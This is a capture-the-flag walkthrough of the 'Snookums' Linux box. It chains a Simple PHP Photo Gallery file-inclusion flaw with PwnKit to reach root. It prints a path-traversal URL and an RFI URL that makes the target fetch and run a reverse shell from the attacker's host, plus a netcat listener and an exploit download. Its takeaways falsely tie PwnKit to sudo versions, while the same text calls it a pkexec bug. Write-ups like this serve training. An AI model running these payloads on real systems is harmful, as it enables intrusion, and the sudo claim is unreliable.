#Linux #RFI #LFI #PwnKit #CVE-2021-4034 #Apache #PHP

## Overview

Snookums is a Linux box that chains two well-known vulnerabilities: a Remote File Inclusion flaw in Simple PHP Photo Gallery v0.8 that hands over a shell as `apache`, followed by PwnKit (CVE-2021-4034) to escalate straight to root. The foothold is worth studying because the notes document trying the LFI variant first, confirming it worked, then pivoting to RFI once RFI was confirmed, a clean illustration of iterating through exploit variants.

## Recon

### Port Scan

The host exposes a wide attack surface for a "simple" web box:

```sh
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2   (anonymous login allowed)
22/tcp   open  ssh     OpenSSH 7.4
80/tcp   open  http    Apache httpd 2.4.6 (CentOS) PHP/5.4.16
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn  Samba smbd 4.10.4
445/tcp  open  microsoft-ds
3306/tcp open  mysql        MySQL (unauthorized)
```

Anonymous FTP was open but timed out on directory listing, so HTTP was the path forward. The web title, "Simple PHP Photo Gallery", is the most useful data from the scan.

### Web Enumeration

Gobuster against port 80:

```sh
gobuster dir -u http://192.168.176.58/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
/css     (Status: 301)
/images  (Status: 301)
/js      (Status: 301)
/photos  (Status: 301)
```

The landing page confirmed version **Simple PHP Photo Gallery v0.8**.

## Foothold

### Remote File Inclusion via image.php

Searching for that version number on ExploitDB turns up two relevant entries. The first (EDB-7786, LFI via `preview` parameter) didn't fire. The second, **SimplePHPGal 0.7 Remote File Inclusion** (EDB-48424), targets the `img` parameter in `image.php`.

LFI proof of concept confirming the traversal works:

```
http://192.168.176.58/image.php?img=../../../../../../../etc/passwd
```

The `/etc/passwd` content rendered inline alongside the gallery, confirming file read. The output also revealed the local user `michael`, useful context for later.

> **Why LFI becoming RFI matters:** an LFI vulnerability reads files from the local filesystem. An RFI vulnerability fetches a URL and executes the result as PHP. When a PHP application passes a user-supplied `img` parameter directly to an include-style function, remote URLs are often accepted too, the filter is usually on file extensions, not URL schemes. Because the server runs PHP, fetching a PHP reverse shell from an attacker-controlled host will cause the *server* to execute it on arrival.

With RFI confirmed, I served `php-reverse-shell.php` from Kali over a Python HTTP server and triggered it through the vulnerable parameter:

```sh
python3 -m http.server 80
```

```
http://192.168.176.58/image.php?img=http://192.168.45.244/php-reverse-shell.php
```

Port 139 was used for the listener (egress filtering required trial and error):

```sh
rlwrap nc -lvnp 139
connect to [192.168.45.244] from (UNKNOWN) [192.168.176.58] 52486
uid=48(apache) gid=48(apache) groups=48(apache)
$ whoami
apache
```

## Privilege Escalation

### PwnKit (CVE-2021-4034)

LinPEAS flagged the sudo version:

```
Sudo version 1.8.23
```

Sudo 1.8.23 is vulnerable to **CVE-2021-4034 (PwnKit)**, a local privilege escalation in `pkexec` (part of polkit) that exploits an argument parsing bug to execute arbitrary code as root. The compiled C variant failed during on-target compilation, so the Python implementation was used instead:

```sh
# download from https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py
sh-4.2$ python pwn.py

whoami
root
```

> **Why the Python variant works when compilation fails:** the Python exploit uses `ctypes` to call the same vulnerable `execve` path without needing a compiler on the target. On constrained systems (missing `gcc`, limited `/tmp` permissions) the Python version is the reliable fallback, and Python 2 was confirmed present via the `python` binary in PATH.

## Root

```sh
cat proof.txt
‹redacted›
```

Local flag was at `/home/michael/local.txt` (michael was the only non-service user in `/etc/passwd`).

## Takeaways

- **Check both LFI and RFI variants when file inclusion is suspected.** The LFI confirmed traversal was possible; RFI converted that read-only primitive into code execution.
- **When compilation fails, reach for the Python exploit.** `ctypes`-based PoCs sidestep the compiler dependency entirely.
- **Old sudo versions are low-hanging fruit.** PwnKit affected every sudo < 1.8.28; spotting the version in LinPEAS output is a one-second check.
